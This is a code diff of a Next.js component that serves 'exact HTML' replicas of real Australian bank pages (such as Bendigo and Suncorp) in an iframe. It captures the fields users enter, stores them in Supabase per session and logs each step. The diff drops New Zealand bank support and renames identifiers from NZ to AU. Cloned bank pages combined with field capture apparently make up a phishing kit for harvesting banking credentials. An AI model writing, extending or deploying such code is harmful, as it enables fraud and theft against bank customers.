@@ -4,7 +4,6 @@ import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { stepToPath } from "@/lib/session-routes";
-import { getNzBankPagePath } from "@/lib/nz-bank-page-map";
 import { getAuBankPages, isAuExactHtmlBank } from "@/lib/au-bank-page-map";
 import { logAuditEvent, flushAuditQueueNow } from "@/lib/audit-event";
 
@@ -208,8 +207,6 @@ function isExternalHref(href: string | null) {
 
 function getActiveButtonColor(bankSlug: string) {
   switch (bankSlug) {
-    case "unity-bank":
-      return "#F56C00";
     case "bendigo-bank":
       return "#00579C";
     case "suncorp-bank":
@@ -225,7 +222,7 @@ function getActiveButtonColor(bankSlug: string) {
   }
 }
 
-export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
+export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const iframeRef = useRef<HTMLIFrameElement>(null);
@@ -233,16 +230,15 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
   const [stepIndex, setStepIndex] = useState(0);
 
   const auPages = useMemo(() => (isAuExactHtmlBank(bankSlug) ? getAuBankPages(bankSlug) : null), [bankSlug]);
-  const nzSinglePath = useMemo(() => getNzBankPagePath(bankSlug), [bankSlug]);
 
-  const totalSteps = auPages?.length ?? (nzSinglePath ? 1 : 0);
+  const totalSteps = auPages?.length ?? 0;
   const isMultiStep = (auPages?.length ?? 0) > 1;
   const isFinalStep = totalSteps > 0 && stepIndex >= totalSteps - 1;
 
   const currentSrc = useMemo(() => {
     if (auPages) return auPages[stepIndex] ?? auPages[auPages.length - 1];
-    return nzSinglePath ?? null;
-  }, [auPages, nzSinglePath, stepIndex]);
+    return null;
+  }, [auPages, stepIndex]);
 
   const submitCapturedFields = useCallback(async (fields: CapturedField[]) => {
     if (!supabase || !sessionId || saving || fields.length === 0) return;
@@ -363,7 +359,7 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       logAuditEvent({
         session_id: sessionId,
         event_kind: "submit",
-        event_action: "nz_exact_submit_error",
+        event_action: "au_exact_submit_error",
         status: "error",
         bank_slug: bankSlug,
         bank_name: bankName,
@@ -378,7 +374,7 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       logAuditEvent({
         session_id: sessionId,
         event_kind: "bank_form",
-        event_action: "nz_exact_submit_wait",
+        event_action: "au_exact_submit_wait",
         status: "ok",
         bank_slug: bankSlug,
         bank_name: bankName,
@@ -403,7 +399,7 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     logAuditEvent({
       session_id: sessionId,
       event_kind: "step",
-      event_action: "nz_exact_advance_html_step",
+      event_action: "au_exact_advance_html_step",
       status: "ok",
       bank_slug: bankSlug,
       bank_name: bankName,
